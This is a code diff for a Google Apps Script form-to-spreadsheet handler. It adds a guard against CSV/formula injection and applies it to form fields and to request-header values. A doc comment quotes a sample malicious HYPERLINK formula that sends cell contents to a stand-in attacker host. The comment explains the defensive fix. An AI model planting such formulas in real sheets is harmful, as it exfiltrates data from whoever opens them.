@@ -172,13 +172,16 @@ function formatHeaderRow(sheet, width) {
 function buildRow(headers, fields, payload, meta) {
   var values = {};
   fields.forEach(function (f) {
-    values[String(f.label)] = String(f.value == null ? '' : f.value);
+    values[String(f.label)] = neutralizeFormula(String(f.value == null ? '' : f.value));
   });
 
   values['Timestamp'] = meta.submittedAt ? new Date(meta.submittedAt) : new Date();
   values['Form'] = String(payload.formId || '');
-  values['Page'] = String(meta.page || '');
-  values['User Agent'] = String(meta.userAgent || '');
+  // Page/User Agent come from request headers (Referer, User-Agent) that a
+  // caller who bypasses the browser can set to anything, so they get the
+  // same formula-injection guard as the form fields above.
+  values['Page'] = neutralizeFormula(String(meta.page || ''));
+  values['User Agent'] = neutralizeFormula(String(meta.userAgent || ''));
 
   return headers.map(function (h) {
     return Object.prototype.hasOwnProperty.call(values, h) ? values[h] : '';
@@ -314,6 +317,18 @@ function formatTimestamp(iso) {
     Session.getScriptTimeZone(),
     'd MMM yyyy, h:mm a'
   );
+}
+
+/**
+ * Google Sheets auto-parses any cell string starting with =, +, -, or @ as a
+ * formula. Form fields are free text from anonymous visitors, so a value like
+ * `=HYPERLINK("https://evil.example/"&A1,"x")` would become a live formula
+ * the moment someone opens the sheet (CSV/formula injection). Prefixing with
+ * an apostrophe forces Sheets to treat it as plain text; the apostrophe
+ * itself is a display-only marker and never appears in the cell value.
+ */
+function neutralizeFormula(value) {
+  return /^[=+\-@]/.test(value) ? "'" + value : value;
 }
 
 function escapeHtml(value) {
